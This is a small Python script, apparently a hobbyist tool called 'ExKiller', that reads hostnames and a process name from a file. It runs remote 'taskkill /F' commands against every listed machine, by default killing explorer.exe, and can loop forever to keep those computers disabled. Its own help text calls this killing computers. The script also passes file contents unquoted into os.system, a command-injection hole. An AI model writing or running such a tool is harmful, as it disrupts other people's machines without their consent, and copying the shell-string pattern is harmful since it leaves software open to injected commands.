import sys
import os
import eventlet
import time
def readfil(filnme,ignore=False):
    f=open(filnme)
    global cpt
    cpt=[]
    for i in f:cpt.append(i)
    if ignore==True:
        cpt[1]="explorer.exe"
    f.close()
    return None
def exkill():
    global cpt
    if int(cpt[0])!=0:
        for i in range(0,int(cpt[0])):
            for name in cpt[2:]:
                with eventlet.Timeout(2,False):
                    print("Killing "+name+" ...")
                    os.system("taskkill /S "+name.strip()+" /U test /IM "+cpt[1].strip()+" /F")
                    time.sleep(2)
        print("Succeed!")
    else:
        while True:
            for name in cpt[2:]:
                print("Killing "+name+" ...")
                os.system("taskkill /S "+name.strip()+" /U test /IM "+cpt[1].strip()+" /F")
    return None
def hlp():
    print("-"*20)
    print("ExKiller 1.1 Single (Public Beta)  --by Relph")
    print("-"*20)
    print("Usage:\npython exkiller [-h]|[-k filename [-i]]")
    print("-h  View the usage of this command")
    print("-k filename  Kill computers from an exist Exkiller-formatted file")
    print("-i  Ignore the assigned task for killing(use explorer.exe instead)")
    print("-"*20)
    return None

if (len(sys.argv)==3) and ("-k" in sys.argv):
    if ("-h" not in sys.argv) and ("-i" not in sys.argv):
        for i in sys.argv[1:]:
            if i!="-k":filnme=i
        readfil(filnme)
        exkill()
    else:hlp()
elif (len(sys.argv)==4) and ("-k" in sys.argv) and ("-i" in sys.argv):
    if "-h" not in sys.argv:
        for i in sys.argv[1:]:
            if (i!="-k") and (i!="-i"):filnme=i
        readfil(filnme,ignore=True)
        exkill()
    else:hlp()
else:hlp()
